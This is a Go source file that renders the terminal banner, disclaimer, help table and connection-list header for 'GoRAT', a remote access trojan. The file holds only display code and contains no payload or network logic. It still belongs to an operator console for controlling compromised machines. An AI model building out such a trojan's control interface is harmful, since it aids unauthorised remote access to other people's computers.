package render

import (
	"fmt"
	"github.com/pterm/pterm"
	"github.com/pterm/pterm/putils"
)

func MainBanner() error {
	fmt.Println()
	s, err := pterm.DefaultBigText.WithLetters(putils.LettersFromStringWithStyle("Go", pterm.FgCyan.ToStyle()),
		putils.LettersFromStringWithStyle("RAT", pterm.FgRed.ToStyle())).Srender()

	pterm.DefaultCenter.Println(s)

	pterm.Info.Println("Remote Access Trojan by @erofcon https://github.com/erofcon")
	pterm.Info.Println("This tool is for educational purpose only, usage of GoRAT for attacking targets without prior mutual consent is illegal.")
	pterm.Info.Println("Input 'help' or 'h' to show commands")

	return err
}

func MainCommands() error {
	err := pterm.DefaultTable.WithHasHeader().WithRowSeparator("-").WithHeaderRowSeparator("-").WithData(pterm.TableData{
		{"command", "purpose"},
		{"ls or list", "show all connection"},
		{"connect <id>", "connect to client"},
	}).Render()

	return err
}

func ConnectionsHeader() {
	pterm.Info.Println("Connection list")
	pterm.Println()
	pterm.DefaultBasicText.WithStyle(pterm.FgLightCyan.ToStyle()).Print("id \t     | address\n")
	pterm.DefaultBasicText.WithStyle(pterm.FgDarkGray.ToStyle()).Print("_________________________________\n")
}
